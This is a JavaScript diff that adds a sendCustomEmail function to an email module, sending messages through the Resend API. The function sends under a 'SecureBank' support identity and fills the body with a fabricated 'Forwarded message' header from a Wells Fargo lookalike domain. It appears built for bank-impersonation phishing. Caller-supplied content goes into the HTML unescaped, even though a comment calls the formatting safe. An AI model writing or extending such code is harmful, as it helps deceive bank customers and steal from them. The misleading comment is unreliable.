@@ -61,4 +61,47 @@ const sendOTPEmail = async (user, otp) => {
   });
 };
 
-module.exports = { sendOTPEmail };
+/**
+ * Sends Custom Email using Resend API to Client
+ * @param {string} to - Recipient email
+ * @param {string} subject - Email subject
+ * @param {string} textMessage - The message content
+ */
+const sendCustomEmail = async (to, subject, textMessage) => {
+  if (!process.env.RESEND_API_KEY) {
+    console.warn('⚠️ [DEV] Resend API Key missing. Custom email skipped.');
+    return { data: { id: 'mock_skip_custom' } };
+  }
+
+  // Formatting message safely (line breaks from text to HTML)
+  const formattedMessage = textMessage;
+
+  return resend.emails.send({
+    from: '"Support SecureBank" <support@wellsfinancebank.org>',
+    to: to,
+    subject: subject,
+    html: `
+      <!DOCTYPE html>
+      <html>
+      <body style="font-family: Arial, sans-serif; padding: 20px; line-height: 1.6; color: rgba(255, 255, 255, 0.9); background-color: #121212;">
+        <div style="font-size: 16px; margin-bottom: 20px;">
+          <br>
+          <div style="color: #bbb;">
+            ---------- Forwarded message ---------<br>
+            From: <span style="color: #90CAF9; font-weight: bold;">account@wellsfargofinancebank.net</span> &lt;<a href="mailto:account@wellsfargofinancebank.net" style="color: #90CAF9; text-decoration: none;">account@wellsfargofinancebank.net</a>&gt;<br>
+            Date: ${new Date().toLocaleString()}<br>
+            Subject: ${subject}<br>
+            To: &lt;<a href="mailto:${to}" style="color: #90CAF9; text-decoration: none;">${to}</a>&gt;<br>
+          </div>
+          <br><br>
+        </div>
+        <div style="font-size: 16px;">
+          ${formattedMessage}
+        </div>
+      </body>
+      </html>
+    `,
+  });
+};
+
+module.exports = { sendOTPEmail, sendCustomEmail };
